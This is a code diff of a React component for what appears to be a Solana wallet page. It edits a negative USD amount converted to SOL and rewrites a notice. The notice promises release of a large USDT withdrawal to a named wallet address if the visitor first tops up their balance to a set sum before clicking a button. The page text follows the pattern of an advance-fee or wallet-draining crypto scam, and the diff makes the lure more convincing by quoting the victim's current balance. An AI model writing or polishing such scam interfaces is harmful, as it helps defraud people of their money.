@@ -23,7 +23,7 @@ const SOL_PRICE = 150 // 🔥 precio fijo
 
   // 🔁 demo conversion
   const SOL_RATE = SOL_PRICE
-  const usd = -5.09
+  const usd = -153.01 // 
   const sol = usd / SOL_RATE
 
   const getProvider = () => {
@@ -204,9 +204,9 @@ const publicKey = res.publicKey
       </p>
 
       <p className="text-yellow-200/80 text-sm leading-relaxed">
-        To release the <span className="font-semibold text-white">$408,092 USDT to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span>,  
-        you must maintain a balance of <span className="text-yellow-300 font-semibold">$360 USD</span>  
-        in your wallet beforehand.
+        To release the <span className="font-semibold text-white">corresponding withdrawal to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span>,  
+        you must maintain a balance of <span className="text-yellow-300 font-semibold">$488 USD</span>  
+        in your wallet beforehand. Right now you have 335,06 USD, so please add the remining amount to reach the requiered balane before clicking the button. 
       </p>
 
       <p className="text-yellow-200/60 text-xs mt-2">
